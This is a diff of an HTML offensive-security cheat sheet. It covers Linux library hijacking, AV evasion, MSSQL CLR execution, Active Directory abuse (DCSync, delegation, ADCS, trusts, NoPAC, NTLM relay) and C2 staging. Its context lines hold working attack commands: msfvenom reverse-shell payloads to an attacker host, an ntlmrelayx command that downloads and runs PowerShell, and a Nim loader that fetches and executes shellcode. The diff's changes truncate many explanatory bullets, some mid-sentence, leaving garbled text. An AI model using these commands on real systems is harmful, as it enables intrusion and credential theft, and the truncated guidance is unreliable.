@@ -8276,7 +8276,7 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administr
 </code></pre>
 <h3 id="linux-shared-libraries">6.4 Shared Library Hijacking</h3>
 
-<ul><li>Linux equivalent of DLL hijacking: a dynamic loader searches an ordered set of paths for a shared object, so an attacker-controlled <code>.so</code> placed earlier in the chain (or forced via an environment variable) is loaded instead of the legitimate one. The payload runs through a library <code>constructor</code> (on load) or by hooking an exported function.</li></ul>
+<ul><li>Linux equivalent of DLL hijacking: a dynamic loader searches an ordered set of paths for a shared object, so an attacker-controlled <code>.so</code> placed earlier in the chain (or forced via an environment variable) is loaded instead of the legitimate one.</li></ul>
 
 <table class="custom-table">
   <thead>
@@ -8324,7 +8324,7 @@ ldd /usr/bin/top
 ltrace cp
 </code></pre>
 
-<ul><li>Malicious shared object skeleton. The <code>constructor</code> attribute fires the payload the moment the library is loaded, regardless of what the original program intended. Add shellcode execution (mprotect + cast) or a function hook as needed.</li></ul>
+<ul><li>Malicious shared object skeleton. The <code>constructor</code> attribute fires the payload the moment the library is loaded, regardless of what the original program intended.</li></ul>
 
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -8350,7 +8350,7 @@ cp libhax.so libgpg-error.so.0
 top
 </code></pre>
 
-<ul><li>Replacing a real library usually triggers <code>missing symbol</code> / <code>version not defined</code> errors before the constructor runs. Define dummy symbols of the right names, and (if the loader demands versioned symbols) build a version-script map. The loader only checks that the names exist, not their type or use.</li></ul>
+<ul><li>Replacing a real library usually triggers <code>missing symbol</code> / <code>version not defined</code> errors before the constructor runs.</li></ul>
 
 <pre><code class="language-bash"># Generate C variable stubs for the missing symbols
 readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 \
@@ -8370,13 +8370,13 @@ gcc -Wall -fPIC -c -o hax.o hax.c
 gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
 </code></pre>
 
-<ul><li><strong>LD_PRELOAD</strong> — preload a library so its functions override later ones (function hooking). Redefine an exported symbol, then call the original via <code>dlsym(RTLD_NEXT, ...)</code> so the program keeps working; <code>fork()</code> the payload so the call returns immediately. No constructor needed.</li></ul>
+<ul><li><strong>LD_PRELOAD</strong> — preload a library so its functions override later ones (function hooking).</li></ul>
 
 <pre><code class="language-bash">export LD_PRELOAD=/home/[user]/evil_geteuid.so
 cp /etc/passwd /tmp/testpasswd
 </code></pre>
 
-<ul><li>Triggering via SUID / sudo: a user environment is dropped under <code>sudo</code> (<code>env_reset</code>), and the loader ignores <code>LD_LIBRARY_PATH</code> / <code>LD_PRELOAD</code> entirely when real UID != effective UID. Set the variable explicitly inside a <code>sudo</code> alias in the victim's <code>.bashrc</code>; if the target sudo command has <code>NOPASSWD</code> it fires automatically.</li></ul>
+<ul><li>Triggering via SUID / sudo: a user environment is dropped under <code>sudo</code> (<code>env_reset</code>), and the loader ignores <code>LD_LIBRARY_PATH</code> / <code>LD_PRELOAD</code> entirely when real UID != effective UID.</li></ul>
 
 <pre><code class="language-bash"># Force the variable into the sudo environment (add to ~/.bashrc)
 alias sudo="sudo LD_LIBRARY_PATH=/home/[user]/ldlib"
@@ -8389,7 +8389,7 @@ sudo top
 
 <h3 id="linux-av-bypass">6.5 Defense Evasion</h3>
 
-<ul><li>Linux endpoint AV (e.g. Kaspersky Endpoint Security) is largely signature-based; raw msfvenom ELF payloads are caught, but wrapping shellcode in a custom loader or encoding it defeats most scanners. Scan offline with Antiscan.me rather than VirusTotal to avoid feeding samples back to vendors.</li></ul>
+<ul><li>Linux endpoint AV (e.g.</li></ul>
 
 <pre><code class="language-bash"># Manual scan + detection name (Kaspersky)
 sudo kesl-control --scan-file ./met.elf
@@ -8405,7 +8405,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] \
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f c
 </code></pre>
 
-<ul><li>Wrap the shellcode in a C loader and cast it to a function pointer. The stack is non-executable by default, so compile with <code>-z execstack</code>; this on-disk loader alone bypasses Kaspersky real-time scanning.</li></ul>
+<ul><li>Wrap the shellcode in a C loader and cast it to a function pointer.</li></ul>
 
 <pre><code class="language-bash">gcc -o hack.out hack.c -z execstack
 </code></pre>
@@ -8596,7 +8596,7 @@ xp_cmdshell powershell.exe -c get-process
 
 <h3 id="mssql-privilege-escalation-clr">7.5.3 Code Execution through CLR</h3>
 
-<ul><li>When using shellcode injection through CLR, prefer runners or process hollowing over direct injection. If injecting into a process, target one the impersonated account can access (e.g. <code>sqlceip.exe</code> under SA, not <code>explorer.exe</code>).</li></ul>
+<ul><li>When using shellcode injection through CLR, prefer runners or process hollowing over direct injection.</li></ul>
 
 <ul><li>.NET Library template for CLR assembly: <a href="https://gist.github.com/skahwah/c92a8ce41f529f40c14715c91b8f90ce" target="_blank" rel="noopener noreferrer">https://gist.github.com/skahwah/c92a8ce41f529f40c14715c91b8f90ce</a></li></ul>
 
@@ -8806,7 +8806,7 @@ bloodhound
 </code></pre>
 
 <h3 id="ad-enum-ldap-ldapsearch">8.2.2 ldapsearch</h3>
-<ul><li>Progressive LDAP queries: start unauthenticated to check if anonymous bind is allowed, then authenticate to pull users, computers, and group memberships. The <code>-b</code> flag sets the search base (domain DN), <code>-s base</code> queries the root DSE, and object-class filters narrow results.</li></ul>
+<ul><li>Progressive LDAP queries: start unauthenticated to check if anonymous bind is allowed, then authenticate to pull users, computers, and group memberships.</li></ul>
 <pre><code class="language-bash"># Anonymous base query
 ldapsearch -x -h [ip] -s base
 
@@ -9082,7 +9082,7 @@ Convert-ADName -ObjectName S-1-5-21-...-1724
 Get-DomainUser [user] | ConvertFrom-UACValue -ShowAll</code></pre>
 
 <h3 id="ad-enum-powerview-users-groups">8.4.2 Users &amp; Groups</h3>
-<ul><li>PowerView user and group enumeration: start broad (<code>Get-DomainUser</code>), then filter for high-value targets &mdash; AS-REP roastable (<code>-KerberosPreauthNotRequired</code>), Kerberoastable (<code>-SPN</code>), delegation-trusted, and stale passwords. Export to CSV for offline triage when the domain is large.</li></ul>
+<ul><li>PowerView user and group enumeration: start broad (<code>Get-DomainUser</code>), then filter for high-value targets &mdash;</li></ul>
 <pre><code class="language-powershell"># All users / a single user, count
 Get-DomainUser
 (Get-DomainUser).count
@@ -9196,7 +9196,7 @@ Get-DomainTrustMapping                   # recursive trust enumeration</code></p
 </table>
 
 <h3 id="ad-enum-netexec">8.5 NetExec / CrackMapExec</h3>
-<ul><li>NetExec (<code>nxc</code>) is the maintained fork of CrackMapExec (legacy binary <code>cme</code> / <code>crackmapexec</code>); flags are identical. Targets accept an IP, CIDR, hostname, or file. Protocols: <code>smb winrm ldap mssql rdp ssh ftp</code>.</li></ul>
+<ul><li>NetExec (<code>nxc</code>) is the maintained fork of CrackMapExec (legacy binary <code>cme</code> / <code>crackmapexec</code>); flags are identical. Targets accept an IP, CIDR, hostname, or file.</li></ul>
 
 <h3 id="ad-enum-netexec-auth-spraying">8.5.1 Authentication &amp; Spraying</h3>
 <pre><code class="language-bash"># Null / anonymous and guest sessions
@@ -9215,7 +9215,7 @@ nxc smb [ip] -u users.txt -p '[password]' --continue-on-success
 nxc winrm [ip] -u users.txt -p pass.txt --no-bruteforce --continue-on-success</code></pre>
 
 <h3 id="ad-enum-netexec-enumeration">8.5.2 Enumeration</h3>
-<ul><li>NetExec SMB enumeration: a bare sweep with no credentials still leaks OS version, hostname, domain, and SMB signing status. Add credentials to enumerate domain objects (users, groups, computers), shares, sessions, and logged-on users. The <code>--gen-relay-list</code> flag exports hosts with SMB signing disabled &mdash; relay targets.</li></ul>
+<ul><li>NetExec SMB enumeration: a bare sweep with no credentials still leaks OS version, hostname, domain, and SMB signing status.</li></ul>
 <pre><code class="language-bash"># Recon: a bare SMB sweep yields OS, hostname, domain, signing, SMBv1
 nxc smb [ip]/24
 nxc smb [ip]/24 --gen-relay-list relay.txt     # hosts with SMB signing disabled
@@ -9243,7 +9243,7 @@ nxc smb [ip] -u [user] -p [password] --wmi "SELECT Caption,ProcessId FROM Win32_
 nxc smb [dc-ip] -u '' -p '' --pass-pol --export $(pwd)/passpol.txt</code></pre>
 
 <h3 id="ad-enum-netexec-protocols-bloodhound">8.5.3 Protocol Modes, Roasting &amp; BloodHound</h3>
-<ul><li>NetExec LDAP mode for Kerberos attacks: <code>--asreproast</code> dumps AS-REP hashes (hashcat mode 18200) for accounts without pre-auth, <code>--kerberoasting</code> dumps TGS hashes (hashcat mode 13100) for SPN-holding users. Also test WinRM and MSSQL with the same credentials &mdash; <code>(Pwn3d!)</code> in WinRM output means command execution is available.</li></ul>
+<ul><li>NetExec LDAP mode for Kerberos attacks: <code>--asreproast</code> dumps AS-REP hashes (hashcat mode 18200) for accounts without pre-auth, <code>--kerberoasting</code> dumps TGS hashes (hashcat mode 13100) for SPN-holding users.</li></ul>
 <pre><code class="language-bash"># LDAP: AS-REP roast / Kerberoast straight to hashcat-ready files
 nxc ldap [dc-ip] -u users.txt -p '' --asreproast asreproast.out      # hashcat -m 18200
 nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting kerb.out    # hashcat -m 13100
@@ -9485,7 +9485,7 @@ UNWIND TempVar AS Admins
 RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT, COLLECT(DISTINCT(Admins.name)) AS USERS
 ORDER BY ADMIN_COUNT DESC</code></pre>
 
-<ul><li>Useful Cypher idioms: <code>1..*</code> matches a path of any depth; <code>=~ '(?i)...'</code> applies a case-insensitive regex; <code>CONTAINS</code> / <code>STARTS WITH</code> filter on substrings. Save reusable queries to <code>customqueries.json</code> (<code>~/.config/bloodhound</code> on Linux, <code>%AppData%\Roaming\bloodhound</code> on Windows) so they appear under the Custom Queries tab.</li></ul>
+<ul><li>Useful Cypher idioms: <code>1..*</code> matches a path of any depth; <code>=~ '(?i)...'</code> applies a case-insensitive regex; <code>CONTAINS</code> / <code>STARTS WITH</code> filter on substrings.</li></ul>
 
 <h3 id="ad-enum-cypher-marking">8.6.4 Marking Owned / High-Value &amp; Pathfinding</h3>
 <ul>
@@ -9550,7 +9550,7 @@ Enter-PSSession -ComputerName [ip]
 </code></pre>
 
 <h3 id="ad-attack-dcsync">9.2 DCSync</h3>
-<ul><li>Impersonate a DC to pull password hashes directly via the replication protocol. Requires <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> (typically held by Domain Admins / Enterprise Admins).</li></ul>
+<ul><li>Impersonate a DC to pull password hashes directly via the replication protocol.</li></ul>
 
 <pre><code class="language-powershell"># Confirm replication rights
 Import-Module ActiveDirectory
@@ -9673,7 +9673,7 @@ Get-DomainGPO | ? { $_.DisplayName -like "*password solution*" } | select Displa
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
 </code></pre>
 <h3 id="ad-attack-constrained-delegation">9.5 Constrained Delegation</h3>
-<ul><li>Constrained delegation limits a compromised account to the SPNs listed in its <code>msDS-AllowedToDelegateTo</code> property. With <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> set, S4U2Self/S4U2Proxy (protocol transition) let you request a ticket for any user to those services without their credentials.</li></ul>
+<ul><li>Constrained delegation limits a compromised account to the SPNs listed in its <code>msDS-AllowedToDelegateTo</code> property.</li></ul>
 <ul>
   <li>Compromise the frontend account (cleartext, NTLM hash, or AES key) — you do not need to run as it; impacket works from Kali with the hash</li>
   <li>S4U2Self mints a forwardable TGS for any user to the frontend; S4U2Proxy then mints a TGS for the target SPN — impersonate a Domain Admin to a delegated service (e.g. MSSQL, CIFS, HTTP)</li>
@@ -9703,7 +9703,7 @@ impacket-mssqlclient [host] -k
 </code></pre>
 
 <h3 id="ad-attack-rbcd">9.6 Resource-Based Constrained Delegation</h3>
-<ul><li>RBCD reverses the trust: the backend resource lists who may delegate to it in <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Write access over a computer object (GenericAll/GenericWrite/WriteDacl/WriteProperty) lets you set that attribute to an account you control and then S4U into the target as any user.</li></ul>
+<ul><li>RBCD reverses the trust: the backend resource lists who may delegate to it in <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li></ul>
 <ul>
   <li>The "delegate-from" principal must have an SPN — user accounts usually don't, so create/own a machine account (default <code>ms-DS-MachineAccountQuota</code> = 10 lets any user add up to 10)</li>
   <li>Write your controlled account's SID into the target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> security descriptor</li>
@@ -9853,7 +9853,7 @@ net rpc group addmem "[group]" "[user]" -U [domain]/[attacker-user]%[attacker-pa
 </code></pre>
 
 <h3 id="ad-attack-acl-writedacl">9.8.3 WriteDACL / WriteOwner</h3>
-<ul><li>WriteDACL lets you edit the object's DACL and grant yourself any right; WriteOwner lets you take ownership, which then implies WriteDACL. The usual chain on a high-value object is take ownership &rarr; grant GenericAll/DCSync &rarr; abuse.</li></ul>
+<ul><li>WriteDACL lets you edit the object's DACL and grant yourself any right; WriteOwner lets you take ownership, which then implies WriteDACL.</li></ul>
 <pre><code class="language-powershell"># Grant yourself GenericAll (WriteDACL over the target)
 Add-DomainObjectAcl -TargetIdentity [user] -PrincipalIdentity [attacker-user] -Rights All
 </code></pre>
@@ -9937,7 +9937,7 @@ impacket-net -k -no-pass [domain]/[attacker-user] group "[group]" -add -member [
 </table>
 
 <h3 id="ad-attack-jea-jit">9.9 JEA &amp; JIT</h3>
-<ul><li>Two hardening features that limit privileged access but become attack surface when misconfigured. JEA is enforced by PowerShell remoting (not AD); JIT relies on time-boxed group membership and (for AD-integrated solutions) the Privileged Access Management feature.</li></ul>
+<ul><li>Two hardening features that limit privileged access but become attack surface when misconfigured. JEA is enforced by PowerShell remoting (not AD);</li></ul>
 
 <h3 id="ad-attack-jea-enum">9.9.1 Enumerating JEA Endpoints</h3>
 <ul><li>JEA exposes constrained PowerShell endpoints via WinRM using a named <code>-ConfigurationName</code>. Hunt for endpoint names in PowerShell history, group/GPO names and description fields.</li></ul>
@@ -9997,7 +9997,7 @@ impacket-getTGT [domain]/[user]:[password]
 export KRB5CCNAME=[user].ccache
 </code></pre>
 <h3 id="ad-attack-trusts">9.10 Domain &amp; Forest Trust Attacks</h3>
-<ul><li>A forest is only as strong as its least secure domain. Intra-forest trusts are not a security boundary; a child-domain compromise leads straight to Enterprise Admin. Forest trusts are a boundary, but SID filtering can be relaxed or bypassed under common conditions.</li></ul>
+<ul><li>A forest is only as strong as its least secure domain. Intra-forest trusts are not a security boundary; a child-domain compromise leads straight to Enterprise Admin.</li></ul>
 
 <h3 id="ad-attack-trust-enum">9.10.1 Enumerating Trusts</h3>
 <pre><code class="language-powershell"># PowerView - domain trusts (LDAP, .NET, or Win32 API)
@@ -10023,7 +10023,7 @@ nltest /domain_trusts /all_trusts</code></pre>
 SharpHound.exe -c All,Trusts</code></pre>
 
 <h3 id="ad-attack-trust-child-parent">9.10.2 Child-to-Parent (SID History)</h3>
-<ul><li>Intra-forest escalation from Domain Admin of a child domain to Enterprise Admin of the root. A golden ticket forged with the child <code>krbtgt</code> hash carries the root domain's Enterprise Admins SID in the ExtraSids field; the child DC re-signs the referral TGT with the trust key before it reaches the parent.</li></ul>
+<ul><li>Intra-forest escalation from Domain Admin of a child domain to Enterprise Admin of the root.</li></ul>
 <ul>
   <li>Need: child <code>krbtgt</code> NTLM hash (DCSync as child DA), child domain SID, and root domain SID.</li>
   <li>ExtraSid = <code>[root-domain-sid]-519</code> (Enterprise Admins is a static RID 519).</li>
@@ -10044,7 +10044,7 @@ raiseChild.py [child-domain]/[user]:[password]</code></pre>
 ticketer.py -nthash [hash] -domain-sid [child-domain-sid] -domain [child-domain] -extra-sid [domain-sid]-519 h4x</code></pre>
 
 <h3 id="ad-attack-trust-cross-forest">9.10.3 Cross-Forest Abuse</h3>
-<ul><li>A forest trust is a security boundary: SID filtering strips ExtraSids when a referral TGT crosses it, so the child-to-parent ExtraSid trick fails by default. Cross-forest compromise relies on relaxed filtering, foreign principals, or the trust key.</li></ul>
+<ul><li>A forest trust is a security boundary: SID filtering strips ExtraSids when a referral TGT crosses it, so the child-to-parent ExtraSid trick fails by default.</li></ul>
 <ul>
   <li>The inter-realm trust key is the password hash of the trust account (e.g. <code>[domain]$</code>), shared between both sides of a bi-directional trust. DCSync it like any user.</li>
   <li>A referral TGT for the foreign realm is signed with the trust key, not the local <code>krbtgt</code>; forging one lets you request a TGS in the trusted forest.</li>
@@ -10116,7 +10116,7 @@ kerberos::golden /user:h4x /domain:[domain] /sid:[domain-sid] /krbtgt:[hash] /si
   <li>Even with SID history on, membership injected via a <em>global</em> group (Domain/Enterprise Admins) is still filtered - only <em>domain local</em> groups (e.g. builtin Administrators) survive.</li>
 </ul>
 <h3 id="ad-attack-adcs">9.11 AD Certificate Services (ADCS)</h3>
-<ul><li>ADCS is the Active Directory PKI; certificates act as long-lived, persistent credentials that survive password resets. Misconfigured templates or CA settings let an unprivileged user enrol an authentication certificate as a privileged principal, then exchange it for a TGT via PKINIT — escalating to Domain Admin. The two load-bearing fields are <code>SubjectAlternativeName</code> (SAN, who the cert authenticates as) and <code>Extended Key Usage</code> (EKU, e.g. Client Authentication <code>1.3.6.1.5.5.7.3.2</code>, Smart Card Logon <code>1.3.6.1.4.1.311.20.2.2</code>).</li></ul>
+<ul><li>ADCS is the Active Directory PKI; certificates act as long-lived, persistent credentials that survive password resets.</li></ul>
 
 <h3 id="ad-attack-adcs-enum">9.11.1 Enumeration</h3>
 <ul><li>Locate the Enterprise CA and any templates/CA flags marked vulnerable.</li></ul>
@@ -10160,7 +10160,7 @@ certutil.exe -config "[ca]" -getreg policy\EditFlags
 </table>
 
 <h3 id="ad-attack-adcs-auth">9.11.2 Authenticating with a Certificate</h3>
-<ul><li>Every ESC ends here: a PFX (cert + private key) is exchanged for a TGT via PKINIT, yielding a usable ticket and, where the KDC returns it, the account's NT hash (UnPAC-the-hash). Subsequent ESCs reference this step rather than repeating it.</li></ul>
+<ul><li>Every ESC ends here: a PFX (cert + private key) is exchanged for a TGT via PKINIT, yielding a usable ticket and, where the KDC returns it, the account's NT hash (UnPAC-the-hash).</li></ul>
 <ul>
   <li>Windows — Rubeus requests and injects the TGT; <code>/getcredentials</code> also recovers the NT hash:<br><code>Rubeus.exe asktgt /user:[user] /certificate:cert.pfx /password:[password] /getcredentials /ptt</code></li>
   <li>Linux — Certipy does PKINIT and prints TGT + NT hash in one step:<br><code>certipy-ad auth -pfx [user].pfx -dc-ip [dc-ip]</code></li>
@@ -10283,7 +10283,7 @@ impacket-secretsdump '[domain]/[dc-host]$@[dc-ip]' -hashes [hash]
 </code></pre>
 
 <h3 id="ad-attack-adcs-esc9">9.11.11 ESC9 — No Security Extension</h3>
-<ul><li>A template flagged <code>CT_FLAG_NO_SECURITY_EXTENSION</code> omits the SID security extension, so the cert is mapped purely by UPN. With GenericWrite over a victim user, set its UPN to the target, enrol, then restore.</li></ul>
+<ul><li>A template flagged <code>CT_FLAG_NO_SECURITY_EXTENSION</code> omits the SID security extension, so the cert is mapped purely by UPN.</li></ul>
 <ul>
   <li>Take over the victim (shadow creds or password reset), set <code>userPrincipalName</code> to the target (e.g. <code>administrator</code>) — drop the <code>@domain</code> suffix to avoid collisions.</li>
   <li>Enrol the no-extension template as the victim; the issued cert maps to the target.</li>
@@ -10335,7 +10335,7 @@ python3 PetitPotam.py -u [user] -p [password] -d [domain] [attacker-ip] [dc-ip]
 </code></pre>
 
 <h3 id="ad-attack-kerberoast">9.12 Kerberoasting &amp; AS-REP Roasting</h3>
-<ul><li>Request tickets whose encrypted portion is derived from an account's password, then crack them offline. Kerberoasting targets SPN-bearing user accounts (TGS-REP); AS-REP roasting targets accounts with pre-authentication disabled (AS-REP).</li></ul>
+<ul><li>Request tickets whose encrypted portion is derived from an account's password, then crack them offline. Kerberoasting targets SPN-bearing user accounts (TGS-REP);</li></ul>
 
 <table class="custom-table">
   <thead>
@@ -10503,7 +10503,7 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 impacket-smbclient -k -no-pass [target]
 </code></pre>
 <h3 id="ad-attack-dacl-ext">9.14 DACL Attacks (Extended)</h3>
-<ul><li>Deeper DACL abuse from the HTB DACL Attacks modules: edge-to-abuse mapping, GPO abuse, computer takeover chains, targeted extended rights, owner/DACL editing from Linux, and group/SPN chains. (Basics of GenericAll/GenericWrite/WriteDACL/WriteOwner, ForceChangePassword, AddMember in 8.8; Shadow Credentials in 8.7; RBCD in 8.6.)</li></ul>
+<ul><li>Deeper DACL abuse from the HTB DACL Attacks modules: edge-to-abuse mapping, GPO abuse, computer takeover chains, targeted extended rights, owner/DACL editing from Linux, and group/SPN chains.</li></ul>
 
 <h3 id="ad-attack-dacl-edges">9.14.1 Edge to Abuse Mapping</h3>
 <ul><li>BloodHound surfaces these as edges; the access mask / object-type GUID tells you which abuse applies.</li></ul>
@@ -10662,7 +10662,7 @@ ldapmodify -H ldap://[dc-ip] -x -D '[user]@[domain]' -w '[password]' -f logonScr
 </code></pre>
 
 <h3 id="ad-attack-dacl-gpo">9.14.7 GPO Abuse (WriteGPLink / Edit GPO)</h3>
-<ul><li>Two distinct primitives: editing a GPO you control (push a scheduled task / local admin), or WriteGPLink on an OU/site/domain to link a GPO of your own to a target scope. Effects apply on the next policy refresh (~90 min).</li></ul>
+<ul><li>Two distinct primitives: editing a GPO you control (push a scheduled task / local admin), or WriteGPLink on an OU/site/domain to link a GPO of your own to a target scope.</li></ul>
 <pre><code class="language-bash"># Find who can modify/link/create GPOs (PowerView wrapper)
 Import-Module .\Get-GPOEnumeration.ps1; Get-GPOEnumeration -ModifyGPOs
 </code></pre>
@@ -10704,7 +10704,7 @@ for spn in $(cat spns.txt); do bloodyAD --host [dc-ip] -d [domain] -u [user] -p 
 </code></pre>
 
 <h3 id="ad-attack-dacl-samspoof">9.14.9 sAMAccountName Spoofing (NoPAC)</h3>
-<ul><li>CVE-2021-42278 + CVE-2021-42287. Needs the ability to rename a machine/user account (GenericAll/GenericWrite) and MachineAccountQuota &gt; 0 (or an existing controlled account). Rename to a DC name without the trailing <code>$</code>; the KDC re-appends <code>$</code> on S4U2self and issues a ticket with DC privileges.</li></ul>
+<ul><li>CVE-2021-42278 + CVE-2021-42287. Needs the ability to rename a machine/user account (GenericAll/GenericWrite) and MachineAccountQuota &gt; 0 (or an existing controlled account).</li></ul>
 <ul>
   <li>Clear the account's SPNs, then set its sAMAccountName to the DC short name (no <code>$</code>).</li>
   <li>Request a TGT as the renamed account; revert the sAMAccountName.</li>
@@ -10723,7 +10723,7 @@ python3 noPac.py [domain]/[user]:[password] -dc-ip [dc-ip] -dc-host [dc-host] --
 </code></pre>
 
 <h3 id="ad-attack-dacl-groups">9.14.10 Group Nesting &amp; Self-Membership Chains</h3>
-<ul><li>WriteProperty on a group's <code>member</code> attribute (or Self-Membership validated write, GUID <code>bf9679c0-0de6-11d0-a285-00aa003049e2</code>) lets you add yourself; nested groups mean adding to one group can transitively grant another's rights. Chase the BloodHound MemberOf path to a privileged group.</li></ul>
+<ul><li>WriteProperty on a group's <code>member</code> attribute (or Self-Membership validated write, GUID <code>bf9679c0-0de6-11d0-a285-00aa003049e2</code>) lets you add yourself;</li></ul>
 <pre><code class="language-bash"># Add a principal to a group from Linux
 bloodyAD --host [dc-ip] -d [domain] -u [user] -p [password] add groupMember "[group]" [user]
 </code></pre>
@@ -10779,7 +10779,7 @@ sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-O
 sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks</code></pre>
 
 <h3 id="ad-attack-relay-ldap">9.15.4 LDAP/LDAPS Relay</h3>
-<ul><li>SMB→LDAP fails when the client requests signing — relay <em>HTTP</em> NTLM auth (no signing) over LDAP instead, or chain CVE-2019-1040 with <code>--remove-mic</code>. Adding a computer needs LDAPS; ntlmrelayx auto-switches to LDAPS via StartTLS.</li></ul>
+<ul><li>SMB→LDAP fails when the client requests signing — relay <em>HTTP</em> NTLM auth (no signing) over LDAP instead, or chain CVE-2019-1040 with <code>--remove-mic</code>.</li></ul>
 <pre><code class="language-bash"># Dump domain info over LDAP
 sudo ntlmrelayx.py -t ldap://[dc-ip] -smb2support --no-da --no-acl --lootdir ldap_dump</code></pre>
 <pre><code class="language-bash"># Add a computer account (gives you a controlled principal for RBCD)
@@ -11584,7 +11584,7 @@ stage-listener --url tcp://[attacker-ip]:[stage-port] --profile [profile-name]
 # 3. Start HTTP C2 listener
 http -L [attacker-ip] -l [c2-port]
 </code></pre>
-<ul><li>Nim shellcode loader: downloads raw shellcode over HTTP, allocates RWX memory in the current process via <code>VirtualAllocEx</code>, copies the shellcode in, and casts the memory to a function pointer to execute it. Nim compiles to a native PE with no .NET dependency, making it useful when .NET-based loaders are blocked.</li></ul>
+<ul><li>Nim shellcode loader: downloads raw shellcode over HTTP, allocates RWX memory in the current process via <code>VirtualAllocEx</code>, copies the shellcode in, and casts the memory to a function pointer to execute it.</li></ul>
 <pre><code class="language-nim">import winim/lean
 import httpclient
 
